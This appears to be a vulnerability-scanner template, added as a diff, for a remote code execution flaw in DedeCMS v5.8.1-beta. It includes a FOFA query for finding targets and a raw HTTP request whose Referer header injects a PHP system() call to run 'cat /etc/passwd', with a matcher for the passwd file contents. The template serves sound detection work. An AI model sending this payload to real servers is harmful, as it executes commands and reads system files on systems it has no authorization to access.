@@ -1,0 +1,35 @@
+id: dedecms-rce
+info:
+  author: ritikchaddha
+  description: 'The vulnerability is due to a variable override vulnerability in DedeCMS
+    that allows an attacker to construct malicious code with template file inclusion
+    without authorization to cause remote command execution attacks and ultimately
+    gain the highest privileges on the server.
+
+    '
+  metadata:
+    fofa-query: app="DedeCMS"
+    verified: true
+  name: DedeCMS v5.8.1-beta - Remote Code Execution
+  reference:
+  - https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html
+  - https://sectime.top/post/1d114771.html
+  severity: critical
+  tags: dedecms,cms,rce
+requests:
+- matchers:
+  - regex:
+    - root:[x*]:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'GET /plus/flink.php?dopost=save&c=cat%20/etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Referer: <?php "system"($c);die;/*ref
+
+    '
